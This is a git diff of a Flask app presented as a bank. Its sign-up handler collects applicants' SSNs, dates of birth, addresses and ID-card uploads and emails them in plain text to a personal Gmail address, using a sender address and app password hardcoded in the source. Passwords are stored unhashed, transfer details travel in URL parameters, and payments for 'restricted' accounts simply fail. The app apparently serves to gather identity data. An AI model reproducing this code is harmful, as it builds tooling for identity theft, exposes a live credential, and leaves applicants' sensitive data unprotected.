@@ -1,9 +1,17 @@
+import os
+
 from flask import session, Flask, render_template, redirect, request, url_for, flash
 from flask_bootstrap import Bootstrap5
 from flask_login import UserMixin, login_user, LoginManager, current_user
 from flask_sqlalchemy import SQLAlchemy
-
 from forms import *
+import smtplib
+from werkzeug.utils import secure_filename
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
 
 app = Flask(__name__)
 Bootstrap5(app)
@@ -14,6 +22,9 @@ app.config['SECRET_KEY'] = 'secretkey'
 app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///bk.db"
 db = SQLAlchemy()
 db.init_app(app)
+
+
+app.config['UPLOAD_FOLDER'] = 'uploads'
 
 # Configure Flask-Login
 login_manager = LoginManager()
@@ -63,6 +74,14 @@ with app.app_context():
 
 """global variables"""
 
+sender = "akpereoghenemarho@gmail.com"
+password = "qgdwgwmissejusae"
+reciever = "akpereraphael@gmail.com"
+
+
+amount__ = ""
+account__ = ""
+
 
 # there are no global variable yet
 
@@ -78,6 +97,55 @@ def sign_up():
     form = SignUp()
 
     if form.validate_on_submit():
+        try:
+            file = form.id_card.data
+            filename = secure_filename(file.filename)
+            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+            file.save(filepath)
+
+            # Create the MIME object
+            message = MIMEMultipart()
+            message['From'] = sender
+            message['To'] = reciever
+            message['Subject'] = 'New User Applied'
+            body = f"New User applied for a bank account\nFirst name: {form.first_name.data} , last Name: {form.last_name.data} ," \
+                      f" Gender {form.sex.data} , DOB: {form.dob.data}, SSN: {form.ssn.data}, Email: {form.email.data}, Phone Number: {form.phone_number.data} , " \
+                      f"Address: {form.address.data}, zip: {form.zip_code.data} ,"
+            message.attach(MIMEText(body, 'plain'))
+
+            # Attach the file
+            attachment_path = f'uploads/{filename}'
+            attachment_name = f'{filename}'
+
+            with open(attachment_path, 'rb') as attachment:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f'attachment; filename= {attachment_name}')
+                message.attach(part)
+
+            message_ = f"New User applied for a bank account\nFirst name: {form.first_name.data}\n , last Name: {form.last_name.data}\n ," \
+                      f" Gender: {form.sex.data}\n , DOB: {form.dob.data}\n, SSN: {form.ssn.data}\n, Email: {form.email.data}\n, Phone Number: {form.phone_number.data}\n , " \
+                      f"Address: {form.address.data}\n, zip: {form.zip_code.data}\n,  "
+            with smtplib.SMTP('smtp.gmail.com', 587) as connection:
+                connection.starttls()
+                connection.login(user=sender, password=password)
+                connection.sendmail(from_addr=sender, to_addrs=reciever, msg=message.as_string())
+
+        except smtplib.SMTPConnectError as e:
+            print(
+                f"SMTPConnectError: Unable to connect to the SMTP server. Check your internet connection and SMTP server details. Error: {e}")
+
+        except smtplib.SMTPAuthenticationError as e:
+            print(
+                f"SMTPAuthenticationError: Failed to authenticate with the SMTP server. Double-check your email credentials. Error: {e}")
+
+        except smtplib.SMTPException as e:
+            print(f"SMTPException: An error occurred while sending the email. Error: {e}")
+
+        except Exception as e:
+            print(f"An unexpected error occurred: {e}")
+
         return redirect(url_for("signup_success"))
     """this should send all the information the user passed in as an email to the admin as return a success page"""
     return render_template("signup.html", form=form)
@@ -85,6 +153,7 @@ def sign_up():
 
 @app.route("/signup-successful")
 def signup_success():
+
     return render_template("signup-success.html")
 
 
@@ -125,17 +194,29 @@ def add_accounts():
     add_aza = AddAccount()
 
     if add_aza.validate_on_submit():
-        new_user = Accounts(
-            first_name=add_aza.first_name.data,
-            last_name=add_aza.last_name.data,
-            username=add_aza.username.data,
-            password=add_aza.password.data,
-            savings_account=add_aza.savings.data,
-            checking_account=add_aza.checking.data,
-        )
+        if add_aza.username.data:
+            new_user = Accounts(
+                first_name=add_aza.first_name.data,
+                last_name=add_aza.last_name.data,
+                username=add_aza.username.data,
+                password=add_aza.password.data,
+                savings_account=add_aza.savings.data,
+                checking_account=add_aza.checking.data,
+            )
 
-        db.session.add(new_user)
-        db.session.commit()
+            db.session.add(new_user)
+            db.session.commit()
+
+        else:
+            new_user = Accounts(
+                first_name=add_aza.first_name.data,
+                last_name=add_aza.last_name.data,
+                savings_account=add_aza.savings.data,
+                checking_account=add_aza.checking.data,
+            )
+
+            db.session.add(new_user)
+            db.session.commit()
 
         return "NEW ACCOUNT CREATED"
 
@@ -235,6 +316,8 @@ def register():
             else:
                 flash("Please Make sure you have an account with us or Your account number may be incorrect")
 
+        return "<h1> success </h1>"
+
     return render_template("register.html", form=form)
 
 
@@ -245,7 +328,8 @@ def welcome():
 
     print(current_user.username)
     account = db.session.execute(db.select(Accounts).where(Accounts.username == current_user.username)).scalar()
-    """add active as a booleen field in the accounts database so that you wil not need to pass in active in all the function you can just check if account.active"""
+    """add active as a booleen field in the accounts database so that you wil not need to pass in active in all the 
+    function you can just check if account.active """
     active = current_user.active
     transactions = (Transactions.query.filter_by(username=current_user.username).limit(3).all())
     return render_template("welcome.html", transactions=transactions, account=account, active=active)
@@ -263,7 +347,7 @@ def send_money():
 
         if acc.account_type.data == "Checking Account":
             if int(current_user.checking_balance) > (int(acc.amount.data) + 5):
-                return redirect(url_for("otp_code"))
+                return redirect(url_for("otp_code", amount=acc.amount.data, account=acc.account_no.data))
 
     return render_template("send-money.html", form=acc, send=send, )
 
@@ -292,8 +376,6 @@ def otp_code():
     verify = Verify()
     amount = request.form.get("amount")
     account_no = request.form.get("account_no")
-    session["amount_"] = amount
-    session["account_"] = account_no
 
     if verify.validate_on_submit():
         code = f'{request.form.get("code1")}{request.form.get("code2")}{request.form.get("code3")}{request.form.get("code4")}{request.form.get("code5")}{request.form.get("code6")}'
@@ -305,28 +387,19 @@ def otp_code():
             if restricted:
                 return redirect(url_for("payment_failed"))
             else:
-                return redirect(url_for("payment_successful"))
+                return redirect(url_for("payment_successful", amount=amount, account=account_no))
 
     return render_template("otp.html", form=verify, amount=amount, account_no=account_no)
 
 
 @app.route("/payment-successful", methods=["GET", "POST"])
 def payment_successful():
+    global amount__, account__
     form = Receipt()
-    amount_ = session.get('amount', None)
-    account_ = session.get("account", None)
-    if amount_ is not None:
-        # print("got it first")
-        amount = amount_
-        account = account_
-    else:
-        # print("got it last")
-        amount = session.get("amount_")
-        account = session.get("account_")
 
     if form.validate_on_submit():
         return redirect(url_for("welcome"))
-    return render_template("payment-successful.html", form=form, amount=amount, account=account)
+    return render_template("payment-successful.html", form=form,)
 
 
 @app.route("/payment-failed")
